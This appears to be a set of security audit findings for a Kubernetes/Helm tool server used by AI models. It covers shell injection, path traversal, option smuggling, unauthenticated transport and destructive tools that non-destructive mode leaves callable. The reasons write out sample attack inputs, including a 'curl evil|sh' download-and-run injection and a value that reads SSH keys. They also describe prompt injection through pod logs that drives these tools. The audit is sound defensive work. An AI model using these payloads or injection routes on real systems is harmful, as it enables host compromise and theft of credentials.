title: Non-destructive mode only hides tools; destructive tools are still callable
reason: ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS only filters tools/list; the tools/call handler never checks it, so a client (or injected prompt) that names kubectl_delete, kubectl_generic, uninstall_helm_chart or cleanup directly still runs them.
fix: In the CallTool handler, reject any name in destructiveTools when nonDestructiveTools is true (and consider also blocking apply/create/patch/scale/exec_in_pod in that mode).

title: Helm tools build shell commands from tool arguments
reason: name, chart, repo and namespace of install/upgrade/uninstall_helm_chart are pasted into a shell string run by execSync; repo='https://x; curl evil|sh' runs on the host. The scanner did not flag this file.
fix: execFile('helm', ['install', name, chart, '--namespace', ns, ...]) with DNS-1123 validation of name/namespace and an https URL check for repo.

title: Helm values file written to a path built from the release name
reason: name comes from the tool arguments, so name='../../home/u/.config/autostart/x' writes attacker-chosen YAML content to any path ending in -values.yaml (relative to the server's cwd), overwriting existing files.
fix: Write values to fs.mkdtempSync(os.tmpdir()) with a fixed filename, and validate name with ^[a-z0-9]([-a-z0-9]*[a-z0-9])?$.

title: explain_resource / list_api_resources build shell commands from tool arguments

evidence.quote: return execSync(command, { encoding: "utf8", env: { ...process.env, KUBECONFIG: process.env.KUBECONFIG } });

reason: resource, apiVersion, apiGroup and verbs are concatenated into a shell string; these 'read-only' tools remain listed in non-destructive mode, so resource='pods; id' gives host code execution there too. Not flagged by the scanner.
fix: execFile/spawn('kubectl', [...args]) with no shell, validate names/namespaces against the DNS-1123 regex ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$, enforce schema enums server-side, and put '--' before positional values.

title: port_forward splits a command string built from tool arguments
reason: No shell, but namespace/resourceName containing spaces add extra kubectl options, e.g. namespace='default --address 0.0.0.0' exposes the forwarded cluster port on all host interfaces.
fix: Build the args array directly: spawn('kubectl', ['port-forward','-n',ns,`${type}/${name}`,`${lp}:${tp}`]) after validating names and that ports are integers.

title: Tools read arbitrary host files into the cluster (--from-file / -f / --patch-file)
reason: Even without shell metacharacters, kubectl_create secret/configmap with fromFile=['/home/u/.ssh/id_rsa'] (or ~/.kube/config, cloud credentials) copies any file the server can read into a cluster object that kubectl_get can then return, so a prompt injection can exfiltrate host secrets; filename/patchFile also accept any path or URL.
fix: Drop fromFile/filename/patchFile from the tool interface or restrict them to an allowlisted directory after realpath containment checks.

title: SSE transport has no authentication or Origin/Host check
reason: When ENABLE_UNSAFE_SSE_TRANSPORT is set, anyone who can reach the port (HOST may be set to 0.0.0.0; a browser page via DNS rebinding even on localhost) gets all tools, including the command injections above. Depends on how it is deployed.
fix: Require a bearer token on /sse and /messages, validate Origin/Host headers, and keep HOST at 127.0.0.1.

title: exec_in_pod runs arbitrary shell commands in any pod without approval
reason: By design the model can run any command in any pod/namespace the kubeconfig allows (reading mounted service-account tokens and secrets); it is not treated as destructive and is not hidden in non-destructive mode.
fix: Add exec_in_pod to destructiveTools, require human confirmation, and allow only configured namespaces.

title: Pod logs and exec output returned raw to the model
reason: Logs and command output are written by workloads (often from external users) and go straight into the model context; injected text there can drive the command-injection tools above.
fix: Wrap returned logs as clearly marked untrusted data and truncate; combined with fixing the shell injections.
